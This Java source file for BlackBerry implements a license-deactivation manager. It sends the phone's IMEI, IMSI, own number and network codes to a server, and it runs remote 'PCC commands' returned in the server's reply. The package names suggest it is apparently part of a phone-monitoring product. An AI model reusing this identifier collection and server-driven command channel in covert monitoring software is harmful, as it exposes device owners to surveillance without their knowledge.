package com.vvt.protsrv;

import java.util.Vector;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefConnectionHistory;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendDeactivate;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.command.response.SendDeactivateCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.protsrv.resource.ProtocolManagerTextResource;
import com.vvt.protsrv.util.ProtSrvUtil;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.version.VersionInfo;

public class SendDeactivateManager implements CommandListener, FxTimerListener {
	
	private static final int DEACTIVATION_INTERVAL = 60 * 10;
	private static final long SEND_DEACTIVATE_GUID = 0x94b6b9e4cc76c3beL;
	private static SendDeactivateManager self = null;
	private LicenseManager license = Global.getLicenseManager();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private Vector listeners = new Vector();
	private SendDeactivateCmdResponse sendDeactCmdRes = null;
	private FxTimer deactivateTimer = new FxTimer(this);
	private boolean progress = false;
	private Preference pref = Global.getPreference();
	private ProtSrvUtil protSrvUtil = new ProtSrvUtil();
	
	private SendDeactivateManager() {
		deactivateTimer.setInterval(DEACTIVATION_INTERVAL);
	}
	
	public static SendDeactivateManager getInstance() {
		if (self == null) {
			self = (SendDeactivateManager)RuntimeStore.getRuntimeStore().get(SEND_DEACTIVATE_GUID);
		}
		if (self == null) {
			SendDeactivateManager sendDeact = new SendDeactivateManager();
			RuntimeStore.getRuntimeStore().put(SEND_DEACTIVATE_GUID, sendDeact);
			self = sendDeact;
		}
		return self;
	}
	
	public void deactivate() {
		licenseInfo = license.getLicenseInfo();
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			if (!progress) {
				progress = true;
				try {
					CommandRequest cmdRequest = new CommandRequest();
					// Meta Data
					CommandMetaData cmdMetaData = new CommandMetaData();
					cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
					cmdMetaData.setProductId(licenseInfo.getProductID());
//					cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
					cmdMetaData.setProductVersion(VersionInfo.getFullVersion());
					cmdMetaData.setConfId(licenseInfo.getProductConfID());
					cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
					cmdMetaData.setLanguage(Languages.ENGLISH);
					cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
					cmdMetaData.setMcc(PhoneInfo.getMCC());
					cmdMetaData.setMnc(PhoneInfo.getMNC());
					cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
					cmdMetaData.setImsi(PhoneInfo.getIMSI());
					cmdMetaData.setBaseServerUrl(protSrvUtil.getBaseServerUrl());
					cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
					cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
					cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
					// Deactivation Data
					SendDeactivate deactData = new SendDeactivate();
			    	cmdRequest.setCommandData(deactData);
			    	cmdRequest.setCommandMetaData(cmdMetaData);	
			    	cmdRequest.setUrl(serverUrl.getServerActivationUrl());
			    	cmdRequest.setCommandListener(this);
			    	// To set application status to be "Deactivation" first. (Sending event protection)
			    	licenseInfo = license.getLicenseInfo();
					licenseInfo.setLicenseStatus(LicenseStatus.DEACTIVATED);
			    	// Execute Command
					comServMgr.execute(cmdRequest);
					deactivateTimer.stop();
					deactivateTimer.start();
				} catch(Exception e) {
					Log.error("SendDeactivateManager.deactivate", null, e);
					progress = false;
					notifyError(e.getMessage());
				}
			}
		} else {
			notifyError(ProtocolManagerTextResource.DEACTIVATION_ALREADY);
		}
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		updateSuccessStatus();
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(sendDeactCmdRes);
		}
	}
	
	private void notifyError(String message) {
		updateErrorStatus(message);
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}
	
	private void setDeactivatedStatus() {
    	licenseInfo = license.getLicenseInfo();
		licenseInfo.setLicenseStatus(LicenseStatus.DEACTIVATED);
		license.commit(licenseInfo);
	}

	private void updateSuccessStatus() {
		// To save last connection.
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setConnectionMethod(sendDeactCmdRes.getConnectionMethod());
		conHistory.setLastConnectionStatus(sendDeactCmdRes.getServerMsg());
		conHistory.setActionType(CommandCode.SEND_DEACTIVATE.getId());
		conHistory.setStatusCode(sendDeactCmdRes.getStatusCode());				
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	private void updateErrorStatus(String message) {
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setLastConnectionStatus(message);
		conHistory.setStatusCode(2);
		conHistory.setActionType(CommandCode.SEND_DEACTIVATE.getId());
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	// CommandListener
	public void onSuccess(StructureCmdResponse response) {
		if (Log.isDebugEnable()) {
			Log.debug("SendDeactivateManager.onSuccess()", "ENTER");
		}
		if (response instanceof SendDeactivateCmdResponse) {
			deactivateTimer.stop();
			progress = false;
			sendDeactCmdRes = (SendDeactivateCmdResponse)response;
			// To set application status to be "Deactivation". Don't check status code. (P'Yut's requirement)
			setDeactivatedStatus();			
			if (sendDeactCmdRes.getStatusCode() == 0) {
				// To process PCC commands.
				rmtCmdMgr.process(sendDeactCmdRes.getPCCCommands());
				notifySuccess();
			} else {
				notifyError(sendDeactCmdRes.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
			}
		}
	}
	
	public void onConstructError(long csid, Exception e) {
		Log.error("SendDeactivateManager.onConstructError", "csid: " + csid, e);
		deactivateTimer.stop();
		progress = false;
		setDeactivatedStatus();
		notifyError(e.getMessage());
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendDeactivateManager.onTransportError", "csid: " + csid, e);
		deactivateTimer.stop();
		progress = false;
		setDeactivatedStatus();
		notifyError(e.getMessage());
	}
	
	public void onServerError(long csid, StructureCmdResponse response) {
		Log.error("SendDeactivateManager.onServerError", "Status Code: " + response.getStatusCode());
		Log.error("SendDeactivateManager.onServerError", "Server Message: " + response.getServerMsg());
		deactivateTimer.stop();
		progress = false;
		setDeactivatedStatus();
		notifyError(response.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
	}	
	
	// FxTimerListener
	public void timerExpired(int id) {
		progress = false;
		notifyError(ProtocolManagerTextResource.PROTOCOL_TIME_OUT_WITHOUT_TRY);
	}
}
